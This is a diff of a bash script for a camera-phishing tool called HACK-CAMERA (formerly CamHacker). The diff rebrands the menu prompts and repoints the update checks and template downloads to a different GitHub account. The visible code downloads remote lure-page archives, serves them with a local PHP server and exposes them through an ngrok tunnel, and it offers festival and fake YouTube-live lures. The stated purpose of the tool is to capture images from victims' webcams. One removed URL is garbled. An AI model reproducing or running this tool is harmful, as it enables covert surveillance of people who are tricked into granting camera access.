@@ -410,18 +410,18 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/HACK-CAMERA/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/KangrokdelHACK-CAMERA/main/files/changelog.log`
+    changelog=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/changelog.log`
     clear
     echo -e "$logo"
-    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
+    echo -e "${info}hack-camera has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update HACK-CAMERA?${yellow}[y/n] > $green"
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
@@ -463,7 +463,7 @@ if [ -z $OPTION ]; then
     exit 1
 else
     if [[ $OPTION == true ]]; then
-        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "${cyan}\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read option
     else
         option=$OPTION
@@ -475,7 +475,7 @@ fi
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -486,7 +486,7 @@ fi
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -506,7 +506,7 @@ fi
         echo -e "${success}Tunneler switched to ${TN} successfully!\n"
         sleep 2
     elif echo $option | grep -q "p"; then
-        printf "\n${ask}Enter Port:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Port:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read pore
         if [ ! -z "${pore##*[!0-9]*}" ] ; then
             PORT=$pore;
@@ -517,7 +517,7 @@ fi
             sleep 2
         fi
     elif echo $option | grep -q "d"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -558,7 +558,7 @@ if ! [ -d $dir ]; then
     mkdir $dir
     cd $dir
     netcheck
-    wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
+    wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
     unzip ${dir}.zip > /dev/null 2>&1
     rm -rf ${dir}.zip
 else
@@ -575,7 +575,7 @@ netcheck
 php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
 sleep 2
 echo -e "${info2}Starting tunnelers......\n"
-rm -rf "$HOME/.hack_camerafolder/log.txt"
+rm -rf "$HOME/.cffolder/log.txt"
 netcheck
 cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
 if $termux; then
